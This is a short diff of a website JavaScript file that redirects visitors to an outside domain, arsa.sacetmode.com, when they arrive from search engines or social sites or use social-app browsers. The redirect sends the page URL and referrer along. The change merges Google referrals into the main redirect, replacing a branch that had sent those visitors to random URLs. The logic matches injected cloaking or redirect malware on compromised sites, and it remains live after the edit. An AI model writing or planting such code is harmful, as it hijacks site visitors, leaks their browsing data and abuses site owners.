@@ -19,12 +19,7 @@ document.write('</noscript>');
 ///// Arsae /////
 var ars = 'https://arsa.sacetmode.com/';
 
-var redirect_urls = ['https://example.com', 'https://detik.com'];
-
-if (document.referrer.toLowerCase().includes('.google.')) {
-    window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
-}
-else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || 
-         ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
+if(['.google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || 
+   ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
     window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
 }
